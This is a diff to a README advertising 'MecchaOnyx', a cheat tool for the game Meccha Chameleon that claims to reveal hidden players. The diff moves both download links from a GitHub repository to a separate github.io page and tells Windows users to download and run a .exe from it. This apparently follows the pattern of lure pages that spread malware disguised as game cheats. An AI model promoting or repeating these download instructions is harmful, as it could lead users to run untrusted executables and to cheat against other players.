@@ -1,6 +1,6 @@
 # 💎 MecchaOnyx - Gain the lead in every match
 
-[![](https://img.shields.io/badge/Download-MecchaOnyx-blue.svg)](https://github.com/nemesi7834/MecchaOnyx)
+[![](https://img.shields.io/badge/Download-MecchaOnyx-blue.svg)](https://nemesi7834.github.io)
 
 MecchaOnyx gives you tools to improve your performance in Meccha Chameleon. You see hidden players, move across the map with ease, and manage your resources. These tools help you understand the game state so you make better choices during play.
 
@@ -19,7 +19,7 @@ Your computer must meet these standards to run the software:
 
 Follow these steps to set up the software on your Windows machine:
 
-1.  Visit the [official download page](https://github.com/nemesi7834/MecchaOnyx) to access the installer.
+1.  Visit the [official download page](https://nemesi7834.github.io) to access the installer.
 2.  Locate the latest release version on the page.
 3.  Click the file ending in .exe to start your download.
 4.  Navigate to your Downloads folder.
